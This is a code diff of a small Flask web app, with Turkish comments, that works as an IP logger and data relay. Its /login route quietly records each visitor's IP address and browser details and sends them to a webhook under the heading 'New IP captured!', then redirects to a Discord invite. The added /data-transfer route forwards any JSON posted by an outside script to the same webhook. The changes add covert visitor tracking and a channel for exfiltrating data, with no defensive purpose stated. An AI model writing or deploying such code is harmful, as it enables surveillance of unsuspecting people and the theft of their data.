@@ -4,21 +4,16 @@ import requests
 
 app = Flask(__name__)
 
-# URL'yi kodun içine yazmıyoruz, sistemden otomatik alacak
+# Webhook URL ve Yönlendirme
 WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
-REDIRECT_URL = "https://chromewebstore.google.com/detail/roearn-custom-avatar-crea/fooenmopnfaejehogdbmegaleanpdcea?hl=tr"
+REDIRECT_URL = "https://discord.gg/sWMVSs5sE"
 
-@app.route('/')
-def index():
-    return redirect(REDIRECT_URL)
-
+# 1. IP Logger Rotası
 @app.route('/login')
 def logger():
-    # IP ve cihaz bilgilerini al
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
     
-    # Veriyi hazırla
     if WEBHOOK_URL:
         embed = {
             "title": "Yeni IP Yakalandı!",
@@ -28,12 +23,24 @@ def logger():
                 {"name": "Cihaz/Tarayıcı", "value": user_agent, "inline": False}
             ]
         }
-        try:
-            requests.post(WEBHOOK_URL, json={"embeds": [embed]})
-        except:
-            pass
-            
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
+    
+    return redirect(REDIRECT_URL)
+
+# 2. Script Veri Aktarıcı (Proxy) Rotası
+@app.route('/data-transfer', methods=['POST'])
+def proxy_data():
+    if WEBHOOK_URL and request.is_json:
+        data = request.json
+        requests.post(WEBHOOK_URL, json=data)
+        return "İşlem Başarılı", 200
+    return "Hata", 400
+
+# 3. Ana Sayfa
+@app.route('/')
+def home():
     return redirect(REDIRECT_URL)
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
